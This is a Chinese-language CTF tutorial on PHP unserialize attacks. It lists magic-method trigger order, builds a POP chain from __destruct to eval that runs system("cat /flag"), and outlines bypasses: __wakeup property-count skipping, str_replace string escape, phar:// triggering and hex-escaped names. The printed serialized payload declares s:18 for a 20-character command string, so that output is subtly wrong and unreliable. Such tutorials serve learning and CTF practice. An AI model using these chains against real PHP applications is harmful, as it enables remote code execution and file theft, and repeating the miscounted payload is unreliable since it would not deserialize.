# Web-PHP 反序列化 + Pop Chain 构造实战

---

## 一、魔术方法触发顺序

```php
// 反序列化入口
unserialize($data)

// 触发顺序:
__wakeup()    → 反序列化后立即调用
__destruct()  → 对象销毁时调用
__toString()  → 对象被当作字符串时
__call()      → 调用不存在的方法时
__get()       → 读取不存在属性时
__set()       → 写入不存在属性时
```

---

## 二、构造 POP Chain

```php
<?php
// 题目代码
class A {
    public $obj;
    public function __destruct() {
        $this->obj->action();  // → 找有 action() 方法的类
    }
}

class B {
    public $cmd;
    public function action() {
        eval($this->cmd);       // → 终点: 代码执行!
    }
}

// Payload 构造:
$a = new A();
$a->obj = new B();
$a->obj->cmd = 'system("cat /flag");';
echo serialize($a);
// O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:3:"cmd";s:18:"system("cat /flag");";}}
```

---

## 三、绕过技巧

```php
// wakeup 绕过 — 修改属性数量
// O:1:"A":1:{}  → 改为 O:1:"A":2:{} → wakeup 被跳过

// 字符逃逸
// 过滤: str_replace('x','yy',$data)
// "x" → "yy" (1字符变2字符)
// 计算逃逸长度 → 闭合字符串 → 注入新属性

// Phar 反序列化
// include('phar://uploads/avatar.jpg') → 触发反序列化
// 几乎所有文件操作函数都触发: file_exists/is_dir/file_get_contents

// 16进制绕过
// s:3:"cmd" → S:3:"\63\6d\64"
```
